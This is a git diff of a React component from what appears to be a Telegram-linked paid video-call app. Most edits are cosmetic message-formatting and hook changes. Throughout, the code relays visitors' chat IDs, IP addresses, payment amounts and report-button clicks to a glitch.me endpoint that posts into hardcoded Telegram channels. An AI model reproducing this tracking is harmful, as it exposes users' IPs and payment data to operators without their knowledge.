@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useState, useCallback } from "react";
 import { useParams } from "react-router-dom";
 import VideoCall from "./Videocall";
 import TelegramUI from "./startPage";
@@ -38,7 +38,7 @@ function Idle() {
     //     return arr[randomIndex];
     // }
 
-    const getCameraStream = async (isFrontCamera) => {
+    const getCameraStream = useCallback(async (isFrontCamera) => {
         try {
             const cameraType = isFrontCamera ? "front" : "back";
             if (cameraStreams[cameraType]) {
@@ -61,7 +61,7 @@ function Idle() {
         } catch (error) {
             return undefined;
         }
-    };
+    }, [cameraStreams]);
 
     const reqFullScreen = async () => {
         var elem = document.documentElement;
@@ -77,14 +77,17 @@ function Idle() {
             } else {
                 await fetchWithTimeout(
                     `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
-                        `*ChatId:* ${chatId}\n*client*: ${profile}\n*VcError*: FullScreenNotSupported`
+                        `ChatId: *${chatId}*\nclient: *${profile}*\nVcError: *FullScreenNotSupported*`
                     )}`
                 );
             }
         } catch (error) {
             console.log(error);
-            const errorDetails = parseError(error);
-            // await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(`ChatId-${chatId}\nclient=${profile}\nVcFullscreenErr-${errorDetails.message}`)}`);
+            await fetchWithTimeout(
+                `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
+                    `ChatId: *${chatId}*\nclient: *${profile}*\nVcError: *FullScreenNotSupported*`
+                )}`
+            );
         }
     };
 
@@ -196,11 +199,9 @@ function Idle() {
             fetchWithTimeout(`${clientData.repl}/deleteCallRequest/${chatId}`);
         } catch (e) {
             console.log(e);
-            const errorDetails = parseError(e);
             await fetchWithTimeout(
                 `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
-                    `*ChatId*: ${chatId}\n*client*: ${profile}\n*VcJoinVDErr* ${parseError(e).message
-                    }`
+                    `ChatId: *${chatId}*\nclient: *${profile}*\nVcJoinVDErr: *${parseError(e).message}*`
                 )}`
             );
         }
@@ -220,7 +221,7 @@ function Idle() {
                 setUserData(userDetails);
                 if (
                     (userDetails &&
-                        userDetails.canReply != 0 &&
+                        userDetails.canReply !== 0 &&
                         userDetails.payAmount >= 30 &&
                         userDetails.videos.length < 10 &&
                         ((userDetails.highestPayAmount >= 250 &&
@@ -265,29 +266,29 @@ function Idle() {
                 if (userDetails.count < 5 && userDetails.videos.length < 5) {
                     await fetchWithTimeout(
                         `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
-                            `*Opened VcUI*\n\n` +
-                            `*Profile:* ${profile}\n` +
-                            `*Chat ID:* ${chatId}\n\n` +
-                            `*All Videos:* ${paymentstats.videos}\n` +
-                            `*Own Videos:* ${userDetails.videos}\n` +
-                            `*Selected Video:* ${video}\n\n` +
-                            `*IP:* ${ip}\n` +
-                            `*Count:* ${userDetails.count}` // Prevents link preview
+                            `Opened VcUI\n\n` +
+                            `Profile: *${profile}*\n` +
+                            `Chat ID: *${chatId}*\n` +
+                            `All Videos: *${paymentstats.videos}*\n` +
+                            `Own Videos: *${userDetails.videos}*\n` +
+                            `Selected Video: *${video}*\n` +
+                            `IP: *${ip}*\n` +
+                            `Count: *${userDetails.count}*` // Prevents link preview
                         )}`
                     );
                 } else {
                     await fetchWithTimeout(
                         `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1002472867139&msg=${encodeForTelegram(
-                            `*Opened VcUI*\n\n` +
-                            `*Profile:* ${profile}\n` +
-                            `*Chat ID:* ${chatId}\n\n` +
-                            `*All Videos:* ${paymentstats.videos}\n` +
-                            `*Own Videos:* ${userDetails.videos}\n` +
-                            `*Selected Video:* ${video}\n\n` +
-                            `*IP:* ${ip}\n` +
-                            `*Count:* ${userDetails.count}\n\n` +
-                            `*Am:* ${userDetails.amount}\n` +
-                            `*Highest Amoun:* ${userDetails.highestPayAmount}\n\n` +
+                            `Opened VcUI\n\n` +
+                            `Profile: *${profile}*\n` +
+                            `Chat ID: *${chatId}*\n` +
+                            `All Videos: *${paymentstats.videos}*\n` +
+                            `Own Videos: *${userDetails.videos}*\n` +
+                            `Selected Video: *${video}*\n` +
+                            `IP: *${ip}*\n` +
+                            `Count: *${userDetails.count}*\n` +
+                            `Am: *${userDetails.amount}*\n` +
+                            `Highest Amount: *${userDetails.highestPayAmount}*\n` +
                             `[Open Chat](https://tgchats.netlify.app?client=${profile}&chatId=${chatId})` // Prevents link preview
                         )}`
                     );
@@ -298,14 +299,14 @@ function Idle() {
                 const errorDetails = parseError(e);
                 await fetchWithTimeout(
                     `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
-                        `*IDle Error*\n\n*ChatId*: ${chatId}\n*client*: ${profile}\n*VcPMTSTATSError*: ${errorDetails.message}`
+                        `IDle Error\n\nChatId: *${chatId}*\nclient: *${profile}*\nVcPMTSTATSError: *${errorDetails.message}*`
                     )}`
                 );
             }
         };
 
         fetchData();
-    }, []);
+    }, [chatId, force, getCameraStream, paymentstats.videos, profile, video]);
 
     return (
         <div style={ { height: "100%" } }>
@@ -379,7 +380,7 @@ function Idle() {
                                             setIsReporting(true); // Set loading state
                                             await fetchWithTimeout(
                                                 `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
-                                                    `*Report Button clicked:* ${userData.chatId}`
+                                                    `Report Button clicked: *${userData.chatId}*`
                                                 )}`
                                             );
                                             window.open(
